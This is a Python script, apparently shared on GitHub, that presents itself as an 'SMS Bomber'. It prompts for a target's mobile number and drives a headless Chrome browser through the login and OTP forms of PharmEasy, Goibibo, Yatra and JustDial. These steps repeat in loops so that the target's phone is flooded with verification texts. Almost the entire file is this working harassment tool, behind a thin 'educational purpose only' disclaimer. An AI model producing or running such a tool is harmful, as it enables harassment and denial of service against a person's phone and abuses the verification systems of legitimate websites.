#pharmesy-5 goibibo-5 justDial-2
#for particular website we can only send 5messages at a time.

try:
    from selenium import webdriver
    import time
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.chrome.options import Options

    def WelcomMessage():
        print('''
                 _     _           _   
             ___| |__ | | __ _ ___| |_ 
            / __| '_ \| |/ _` / __| __|
            \__ \ |_) | | (_| \__ \ |_  
            |___/_.__/|_|\__,_|___/\__|.........
                                    
        ''')
        print('\tSblast a SMS Bomber created by sciencelabwork \n\n\tThis is for educational purpose only!! \n\n\tIf you misuse it then it\'s not my fault!\n \n\n\tNow go and enjoy!!')
        print('')

    WelcomMessage()
    x = 0

    mobileNumber = int(input('Please input Targest\'s Mobile number: '))

    #frequency = int(input('Please input number of messages: (Max 30)'))

    #browser = webdriver.PhantomJS(executable_path='phantomjs-2.1.1-macosx/bin/phantomjs')
    browserop = Options()
    browserop.add_argument("--headless")
    browser = webdriver.Chrome(ChromeDriverManager().install(), chrome_options=browserop)

    def pharmeasySMS():
        browser.get('https://pharmeasy.in/?src=sidebarmenu#login')
        time.sleep(4)
        numberField = browser.find_element_by_class_name('jss34')
        numberField.send_keys(mobileNumber)
        clickf = browser.find_element_by_xpath('//button[@type="submit"]')
        clickf.click()
        time.sleep(3)
        newX = browser.find_element_by_class_name('_2tdEn')
        newX.click()
        time.sleep(5)

    def goibiboSMS():
        browser.get('https://www.goibibo.com/accounts/login/')
        time.sleep(4)
        numberField = browser.find_element_by_id('authMobile')
        numberField.send_keys(mobileNumber)
        continueButton = browser.find_element_by_xpath('//button[@type="submit"]')
        continueButton.click()
        time.sleep(3)
        """resetbtn = browser.find_element_by_link_text('RESEND CODE')
        resetbtn.click()
        """
    def justDialSms():
        browser.get('https://www.justdial.com')
        time.sleep(3)
        loginClick = browser.find_element_by_id('h_login')
        loginClick.click()
        time.sleep(2)
        namefield = browser.find_element_by_id('lgn_name')
        namefield.send_keys('Justsake')
        numberfield = browser.find_element_by_id('lgn_mob')
        numberfield.send_keys(mobileNumber)
        sendOTPbtn = browser.find_element_by_xpath('//button[@id="lgn_smtn"]')
        sendOTPbtn.click()
        time.sleep(3)

    def ytraSMS():
        browser.get('https://secure.yatra.com/social/common/yatra/signin.htm')
        time.sleep(3)
        numberField = browser.find_element_by_id('login-input')
        numberField.send_keys(mobileNumber)
        continueBtn = browser.find_element_by_id('login-continue-btn')
        continueBtn.click()
        time.sleep(3)



    for i in range(4):
        try:
            pharmeasySMS()
            x=1
            print('success')
        except:
            print('failed')
        try:
            x=1
            goibiboSMS()
            print('success')
        except:
            print('failed')
        try:
            x=1
            ytraSMS()
            print('success 1')
        except:
            print('failed')
        print("Threshold " , i , " of ",x ,"-Messages success")
    for i in range(3):
        try:
            justDialSms()
            x=2
        except:
            print('failed')
        print("Threshold 2 of 2-Messages success")
    browser.quit()
    print("Success in sending")
except:
    print('''
     _____                     
    | ____|_ __ _ __ ___  _ __ 
    |  _| | '__| '__/ _ \| '__|
    | |___| |  | | | (_) | |   
    |_____|_|  |_|  \___/|_|     OCCURED
                           
    ''')
    print('\nAn error occured while running this programm')
    print('\nYou need to install some of the modules to run this programm')
    print('\n>>>So type in terminal >>>python3 install.py')

print("\n\n\t\t\tBY scienceLabwork!")
print("\n\nfor more projects -: https://github.com/scienceLabwork")
